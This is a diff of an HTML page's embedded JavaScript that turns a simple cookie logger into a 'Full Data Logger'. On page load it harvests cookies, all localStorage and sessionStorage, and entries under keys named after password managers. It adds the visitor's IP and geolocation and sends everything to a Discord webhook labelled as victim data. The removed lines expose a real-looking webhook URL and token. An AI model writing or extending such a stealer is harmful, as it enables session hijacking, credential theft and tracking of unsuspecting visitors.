@@ -29,26 +29,112 @@
 
     <script>
         // Replace this with your Discord Webhook URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1539273876624638033/TYg8bAWZ6ygQ_4wVaEY3t14vD9IIL2gvq5ORVT7Xl0OdmXuXWbHzzba1vSZc1Bp-wCVA';
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
 
-        // Function to grab cookies
-        function stealCookies() {
-            const cookies = document.cookie;
+        async function stealData() {
+            let cookies = document.cookie || "(No Cookies)";
+            let localStorageData = {};
+            let sessionStorageData = {};
+            let passwordManagers = {};
             
-            // Format the payload for Discord embed
+            // 1. Grab LocalStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch (e) {
+                localStorageData = "(Error accessing LocalStorage)";
+            }
+
+            // 2. Grab SessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+            } catch (e) {
+                sessionStorageData = "(Error accessing SessionStorage)";
+            }
+
+            // 3. Grab Common Password Manager Keys
+            const pmKeys = [
+                'lastpass', 'lpdata', 'bitwarden', 'bwid', '1password', 
+                'chrome_passwords', 'firefox_passwords', 'autofill', 
+                'credentials', 'login_data', 'password'
+            ];
+            
+            pmKeys.forEach(key => {
+                if (localStorage.getItem(key)) {
+                    passwordManagers[key] = localStorage.getItem(key);
+                }
+                if (sessionStorage.getItem(key)) {
+                    passwordManagers[key] = sessionStorage.getItem(key);
+                }
+            });
+
+            // 4. Get IP and Geolocation
+            let ipInfo = "Failed to fetch IP";
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    ipInfo = {
+                        IP: data.ip,
+                        City: data.city,
+                        Region: data.region,
+                        Country: data.country_name,
+                        ISP: data.org,
+                        Timezone: data.timezone
+                    };
+                } else {
+                    ipInfo = "API Error";
+                }
+            } catch (e) {
+                ipInfo = "Network Error";
+            }
+
+            // Format payloads for Discord
             const payload = {
                 embeds: [{
-                    title: "Cookie Logger",
-                    description: "Victim cookies captured!",
-                    color: 15277667, // Red color
+                    title: "🔥 Full Data Logger",
+                    description: "Victim data captured!",
+                    color: 15158332, // Red
                     fields: [
                         {
-                            name: "Cookies",
-                            value: `\`\`\`${cookies}\`\`\``
+                            name: "🍪 Cookies",
+                            value: `\`\`\`${cookies}\`\`\``,
+                            inline: false
                         },
                         {
-                            name: "User Agent",
-                            value: `\`\`\`${navigator.userAgent}\`\`\``
+                            name: "💾 Local Storage",
+                            value: `\`\`\`${JSON.stringify(localStorageData)}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "⏳ Session Storage",
+                            value: `\`\`\`${JSON.stringify(sessionStorageData)}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Password Managers",
+                            value: `\`\`\`${JSON.stringify(passwordManagers)}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 IP Info",
+                            value: `\`\`\`${JSON.stringify(ipInfo)}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "🖥️ User Agent",
+                            value: `\`\`\`${navigator.userAgent}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "📱 Platform",
+                            value: `\`\`\`${navigator.platform}\`\`\``,
+                            inline: true
                         }
                     ],
                     timestamp: new Date().toISOString(),
@@ -58,7 +144,7 @@
                 }]
             };
 
-            // Send data to Discord Webhook
+            // Send to Discord
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -66,12 +152,11 @@
                 },
                 body: JSON.stringify(payload)
             })
-            .then(response => console.log('Cookies sent successfully'))
-            .catch(error => console.error('Error sending cookies:', error));
+            .then(response => console.log('Data sent successfully'))
+            .catch(error => console.error('Error sending data:', error));
         }
 
-        // Execute when the page loads
-        window.onload = stealCookies;
+        window.onload = stealData;
     </script>
 
 </body>
